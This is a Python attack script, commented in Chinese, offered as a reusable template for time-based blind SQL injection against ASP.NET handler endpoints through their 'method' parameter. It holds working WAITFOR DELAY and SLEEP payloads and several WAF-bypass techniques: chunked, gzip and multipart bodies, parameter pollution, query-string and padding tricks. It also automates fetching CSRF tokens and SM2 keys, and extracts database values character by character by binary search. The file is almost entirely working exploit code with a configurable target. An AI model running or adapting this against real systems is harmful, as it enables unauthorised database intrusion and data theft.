# -*- coding: utf-8 -*-
"""
======================================================================
 method_injection.py — ASP.NET Handler method参数注入通用模板
======================================================================
适用目标: manage.ashx / handler.ashx 类 ASP.NET Handler
  method参数控制SQL查询路由 (CASE/IF/SWITCH)
  单引号/WAITFOR/SLEEP被WAF拦截 → 多种绕过策略

打法:
  1. 基线采集 (10-20次, 克服WAF抖动)
  2. 时间检测: ;WAITFOR DELAY / AND SLEEP / OR SLEEP
  3. WAF绕过: chunked/gzip/multipart/PP/QS/RandomPrefix
  4. 条件盲注(确认后): IF(cond,delay,0) 逐位提取
  5. SM2模式: 自动获取CSRF+SM2公钥加密 (目标类)

用法:
  python3 method_injection.py
  改 CONFIG 段的目标和基线即可复用
======================================================================
"""

import subprocess, time, sys, os, json, statistics, re, uuid, io, gzip, urllib.parse

# ============================================================
# [CONFIG] 改这里
# ============================================================
TARGET = "https://target.com/Handler.ashx"                   # 目标URL
BASELINE_METHOD = "login"         # 合法的method值
DB_TYPE = "MSSQL"                             # MSSQL | MySQL | PostgreSQL
DELAY_SEC = 5                                 # 延时秒数
SM2_MODE = False                              # True=SM2加密模式
SM2_LOGIN_URL = "https://TARGET/Home/Login"   # SM2模式下的登录页
TIMEOUT = 25
SAMPLE_N = 15                                 # 每组采样数
BYPASS_MODE = "direct"                        # direct|chunked|gzip|multipart|pollution|qs

# ============================================================
# 时间盲注引擎
# ============================================================
class TimeBlind:
    def __init__(self):
        self.baseline_times = []
        self.baseline_median = 0
        self.baseline_stdev = 0
        self.results = []
        self.log_file = f"blind_{int(time.time())}.log"

    def log(self, msg):
        ts = time.strftime("%H:%M:%S")
        line = f"[{ts}] {msg}"
        print(line)
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    # ==================== 发送 ====================
    def send(self, method_val, timeout=None, bypass="direct"):
        timeout = timeout or TIMEOUT
        body_str = f"method={method_val}&username=admin&password=test"
        extra_hdrs = {}
        url = TARGET

        # --- WAF绕过 ---
        if bypass == "chunked":
            body, extra_hdrs = self._chunked(body_str)
        elif bypass == "gzip":
            body = body_str.encode()
            buf = io.BytesIO()
            with gzip.GzipFile(fileobj=buf, mode='w') as f:
                f.write(body)
            body = buf.getvalue()
            extra_hdrs = {"Content-Encoding": "gzip"}
        elif bypass == "multipart":
            body, extra_hdrs = self._multipart(body_str)
        elif bypass == "pollution":
            body = f"method={BASELINE_METHOD}&method={method_val}&username=admin&password=test".encode()
        elif bypass == "qs":
            enc = urllib.parse.quote(method_val, safe='')
            url = f"{TARGET}?method={enc}"
            body = b"username=admin&password=test"
        elif bypass == "prefix500":
            body = f"method={'x'*500}{method_val}&username=admin&password=test".encode()
        elif SM2_MODE:
            body = self._sm2_body(method_val)
        else:
            body = body_str.encode()

        cmd = [
            "curl", "-sk", "--connect-timeout", "10", "--max-time", str(timeout),
            "-X", "POST",
            "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ]
        for k, v in extra_hdrs.items():
            cmd.extend(["-H", f"{k}: {v}"])
        cmd.extend(["--data-binary", body])
        cmd.append(url)

        start = time.time()
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=timeout+2)
            t = time.time() - start
            resp = r.stdout.decode("utf-8", errors="replace").strip()
            return t, len(resp), resp[:30]
        except subprocess.TimeoutExpired:
            return timeout, 0, "TO"
        except Exception as e:
            return 0, 0, f"E:{str(e)[:20]}"

    def _chunked(self, s):
        chunks = []
        for i in range(0, len(s), 15):
            chunk = s[i:i+15]
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")
        return "".join(chunks).encode(), {"Transfer-Encoding": "chunked"}

    def _multipart(self, s, boundary=None):
        boundary = boundary or f"--boundary{uuid.uuid4().hex[:12]}"
        parts = []
        for kv in s.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
        parts.append(f"--{boundary}--\r\n")
        return "".join(parts).encode(), {"Content-Type": f"multipart/form-data; boundary={boundary}"}

    def _sm2_body(self, account_val, password="test"):
        from gmssl import sm2 as gm_sm2
        cf = f"/tmp/h_sm2_{uuid.uuid4().hex[:8]}.txt"
        try:
            r = subprocess.run(["curl", "-sk", "--connect-timeout", "10", "--max-time", "12",
                "-c", cf, SM2_LOGIN_URL,
                "-H", "User-Agent: Mozilla/5.0"], capture_output=True, timeout=15)
            html = r.stdout.decode("utf-8", errors="replace")
            token = (re.search(r'__RequestVerificationToken.*?value="([^"]+)"', html) or [None,""]).group(1)
            pubkey = (re.search(r'_FRONTEND_DATA_CLIENTSUBMIT_ENCRYPTION_KEY.*?value="([^"]+)"', html) or [None,""]).group(1)
            if not token or not pubkey: return b""
            priv = os.urandom(32).hex()
            c = gm_sm2.CryptSM2(public_key=pubkey, private_key=priv, mode=1)
            pwd_enc = "04" + c.encrypt(password.encode()).hex()
            nonce = str(int(time.time() * 1000))
            return f"__RequestVerificationToken={token}&nonce={nonce}&account={account_val}&password={pwd_enc}".encode()
        finally:
            try: os.remove(cf)
            except: pass

    # ==================== 基线 ====================
    def baseline(self, n=20):
        self.log(f"[BASELINE] {n}次")
        for i in range(n):
            t, sz, resp = self.send(BASELINE_METHOD, timeout=12)
            if 0 < t < 60:
                self.baseline_times.append(t)
            time.sleep(0.3)

        if not self.baseline_times:
            self.log("基线全失败!")
            return False

        self.baseline_median = statistics.median(self.baseline_times)
        self.baseline_stdev = statistics.stdev(self.baseline_times) if len(self.baseline_times) > 1 else 0
        self.log(f"  median={self.baseline_median:.3f}s stdev={self.baseline_stdev:.4f}s "
                 f"阈值={self.baseline_median+3*self.baseline_stdev:.3f}s")
        return True

    # ==================== 时间测试 ====================
    def test(self, label, method_val, n=None, timeout=None, bypass=None):
        n = n or SAMPLE_N
        timeout = timeout or max(TIMEOUT, DELAY_SEC + 10)
        bypass = bypass or BYPASS_MODE
        self.log(f"\n[{label}] (bypass={bypass})")
        self.log(f"  payload: {method_val[:60]}")

        times = []
        for i in range(n):
            t, sz, resp = self.send(method_val, timeout=timeout, bypass=bypass)
            times.append(t)
            self.log(f"  [{i+1}/{n}] {t:.3f}s [{sz}B] {resp[:20]}")
            time.sleep(0.3)

        ts = [t for t in times if 0 < t < 120]
        if not ts:
            self.log("  全失败"); return None

        avg = statistics.mean(ts)
        med = statistics.median(ts)
        std = statistics.stdev(ts) if len(ts) > 1 else 0
        diff = med - self.baseline_median
        thresh = self.baseline_median + 3 * self.baseline_stdev
        outliers = sum(1 for t in ts if t > thresh)
        z = diff / self.baseline_stdev if self.baseline_stdev > 0 else 0

        self.log(f"  med={med:.3f}s Δ={diff:+.3f}s z={z:.2f} outliers={outliers}/{len(ts)}")

        verdict = "!!" if diff > 2 and outliers > len(ts)*0.25 else \
                  "?" if diff > 0.5 else "-"
        self.log(f"  [{verdict}]")

        r = {"label": label, "payload": method_val, "median": med,
             "diff": diff, "z": z, "outliers_pct": outliers/len(ts)*100,
             "verdict": verdict, "times": [round(x,3) for x in ts]}
        self.results.append(r)
        return r

    # ==================== 条件注入提取 ====================
    def cond(self, sql_condition):
        """测试条件真假 (True=延时, False=不延时)"""
        p = f"{BASELINE_METHOD}' AND {sql_condition}--"
        r = self.test(f"cond:{sql_condition[:40]}", p, n=5, timeout=15)
        if r and (r["diff"] > 0.5 or r["outliers_pct"] > 20):
            return True
        # NOT condition
        p2 = f"{BASELINE_METHOD}' AND NOT({sql_condition})--"
        r2 = self.test(f"NOT:{sql_condition[:40]}", p2, n=5, timeout=15)
        return bool(r2 and r2["diff"] > 0.5)

    def extract_char(self, query, pos):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"
            if self.cond(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else f"0x{lo:02x}"

    def extract_str(self, query, max_len=32):
        s = ""
        self.log(f"\n提取: {query}")
        for pos in range(1, max_len+1):
            ch = self.extract_char(query, pos)
            s += ch
            self.log(f"  [{pos}] '{ch}' → \"{s}\"")
            if ch in ('\x00', ''): break
        return s

    # ==================== 保存 ====================
    def save(self, path=None):
        path = path or f"result_{int(time.time())}.json"
        with open(path, "w", encoding="utf-8") as f:
            json.dump({
                "target": TARGET,
                "baseline_median": self.baseline_median,
                "baseline_stdev": self.baseline_stdev,
                "baseline_times": [round(x,3) for x in self.baseline_times],
                "results": self.results,
            }, f, indent=2, ensure_ascii=False)
        self.log(f"\n结果保存: {path}")


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    print(f"""
{'='*60}
  method注入时间盲注
  目标: {TARGET}
  基线: {BASELINE_METHOD}
  DB:   {DB_TYPE}
  绕过: {BYPASS_MODE}
{'='*60}
""")

    b = TimeBlind()

    # Phase 1: 基线
    print("\n>>> Phase 1: 基线")
    if not b.baseline(n=20):
        sys.exit(1)

    # Phase 2: 时间检测
    print("\n>>> Phase 2: 时间注入检测")
    for label, payload in [
        (f"WAITFOR {DELAY_SEC}s",  f"{BASELINE_METHOD}'; WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
        (f"WAITFOR {DELAY_SEC}s2", f"{BASELINE_METHOD}' WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
        (f"OR+WAITFOR {DELAY_SEC}s", f"{BASELINE_METHOD}' OR 1=1 WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
        (f"AND+WAITFOR {DELAY_SEC}s", f"{BASELINE_METHOD}' AND 1=1 WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
        (f"SLEEP {DELAY_SEC}s",     f"{BASELINE_METHOD}' AND SLEEP({DELAY_SEC})--"),
        (f"OR+SLEEP {DELAY_SEC}s",  f"{BASELINE_METHOD}' OR SLEEP({DELAY_SEC})--"),
        (f"IF 1=1 DELAY",           f"{BASELINE_METHOD}'; IF(1=1) WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
        (f"IF 1=2 DELAY",           f"{BASELINE_METHOD}'; IF(1=2) WAITFOR DELAY '0:0:{DELAY_SEC}'--"),
    ]:
        b.test(label, payload, n=10)

    # Phase 3: 条件盲注数据提取 (确认有注入后取消注释)
    # print("\n>>> Phase 3: 数据提取")
    # b.log(f"DB@VERSION: {b.extract_str('@@VERSION', 20)}")
    # b.log(f"DB_NAME:    {b.extract_str('DB_NAME()', 20)}")
    # b.log(f"USER:       {b.extract_str('CURRENT_USER', 20)}")

    b.save()
    b.log(f"日志: {b.log_file}")
